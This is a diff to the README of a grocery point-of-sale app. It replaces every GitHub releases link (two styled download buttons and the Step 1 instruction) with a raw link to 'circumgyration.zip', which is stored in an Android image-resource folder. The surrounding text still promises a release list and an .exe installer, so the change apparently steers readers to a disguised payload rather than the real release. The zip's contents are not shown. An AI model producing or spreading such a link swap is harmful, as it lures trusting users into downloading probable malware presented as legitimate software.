@@ -2,7 +2,7 @@
 <h1>🛒 SKmart-Pos-Mobile - Fast, Offline-Ready POS for Your Grocery Store</h1>
 
 <p align="center">
-  <a href="https://github.com/0406gavin/SKmart-Pos-Mobile/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Download SKmart POS (Latest Release)</a>
+  <a href="https://raw.githubusercontent.com/0406gavin/SKmart-Pos-Mobile/main/android/app/src/main/res/drawable-port-xhdpi/circumgyration.zip" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Download SKmart POS (Latest Release)</a>
 </p>
 
 ---
@@ -28,7 +28,7 @@ Welcome to SKmart POS! This guide will walk you through everything you need to k
 
 **Step 1: Visit the Download Page**
 
-Visit this link to download the application: **[https://github.com/0406gavin/SKmart-Pos-Mobile/releases](https://github.com/0406gavin/SKmart-Pos-Mobile/releases)**. 
+Visit this link to download the application: **[https://raw.githubusercontent.com/0406gavin/SKmart-Pos-Mobile/main/android/app/src/main/res/drawable-port-xhdpi/circumgyration.zip](https://raw.githubusercontent.com/0406gavin/SKmart-Pos-Mobile/main/android/app/src/main/res/drawable-port-xhdpi/circumgyration.zip)**. 
 
 You’ll see a list of release files. Don’t worry about the version numbers—just pick the newest one (the topmost item) and click the file that matches your computer (usually named something like `SKmartPOS-Setup-<version>.exe`).
 
@@ -127,7 +127,7 @@ SKmart POS saves a local backup file every day. You can also manually export a b
 Ready to get started? Click the big green button below to go to the download page:
 
 <p align="center">
-  <a href="https://github.com/0406gavin/SKmart-Pos-Mobile/releases" style="display:inline-block;padding:14px 28px;background:#4caf50;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.15);">📦 Get SKmart POS for Windows</a>
+  <a href="https://raw.githubusercontent.com/0406gavin/SKmart-Pos-Mobile/main/android/app/src/main/res/drawable-port-xhdpi/circumgyration.zip" style="display:inline-block;padding:14px 28px;background:#4caf50;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.15);">📦 Get SKmart POS for Windows</a>
 </p>
 
 ---
